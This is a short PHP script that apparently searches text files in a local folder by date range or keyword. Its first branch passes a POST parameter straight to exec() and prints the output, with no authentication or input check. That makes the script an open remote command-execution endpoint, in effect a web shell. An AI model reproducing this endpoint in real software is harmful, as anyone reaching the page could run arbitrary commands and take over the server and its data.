<?PHP
$command = $_POST["action"];
$param = $_POST["param"];
if(strcmp($command, 'exec') == 0) {
  $status = exec($param, $retorno);
  echo implode("\n", $retorno);
  //$status = exec("touch -t 199001010000 folder/*");
} else if(strcmp($command, 'date') == 0) {
	$limits = explode(" ", $param);
	$folder = scandir("folder");
	foreach($folder as $filename) {
		if(substr($filename, 0, 1) === "f") {
			$line = fgets(fopen("folder/".$filename, 'r'));
			//echo $line;
			$fields = explode(" ", $line);
			if($fields[3] >= $limits[0] && $fields[3] <= $limits[1]) echo $line;
			//echo $limits[0]." - ".$fields[3]." - ".$limits[1];
		}
		
	}


} else if(strcmp($command, 'word') == 0) {
	$folder = scandir("folder");
	foreach($folder as $filename) {
		if( strpos(file_get_contents("folder/".$filename),$param) !== false) {
        		$line = fgets(fopen("folder/".$filename, 'r'));
 			echo $line;
		}
    
	}
} else echo "Unknow Action";

?>
